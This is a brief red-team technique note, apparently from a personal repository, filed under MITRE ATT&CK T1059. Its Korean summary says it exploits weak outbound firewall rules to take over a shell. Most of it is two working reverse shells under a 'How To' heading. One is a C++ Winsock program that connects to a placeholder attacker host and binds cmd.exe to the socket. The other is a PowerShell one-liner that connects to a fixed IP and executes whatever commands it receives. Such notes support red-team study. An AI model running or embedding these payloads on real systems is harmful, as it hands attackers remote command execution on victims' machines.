# T1059-Command-and-Scripting-Interpreter(Reverse Shell)

Status: Execution

---

# Summary

- MITRE ATT&CK : Enterprise - Execution - Command and Scripting Interpreter
- Require Privilege : Any
- Running Privilege : Any
- Description : 아웃바운드 방화벽 정책이 약하게 설정 된 것을 이용하여 쉘을 탈취

---

# How To

## C++

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <WinSock2.h>
#include <windows.h>

//#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")
#pragma comment(lib, "ws2_32")

int main(int argc, char *argv[])
{
	WSADATA wsaData;
	SOCKET s1;
	struct sockaddr_in hax;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(8080);
	hax.sin_addr.s_addr = inet_addr("attacker[.]cnc[.]com");

	WSAConnect(s1, (SOCKADDR *)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	si.hStdInput = (HANDLE)s1;
	si.hStdOutput = (HANDLE)s1;
	si.hStdError = (HANDLE)s1;

	TCHAR cmd[256] = L"cmd.exe";
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

	return 0;
}
```

## Powershell

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```



(계속 추가 예정)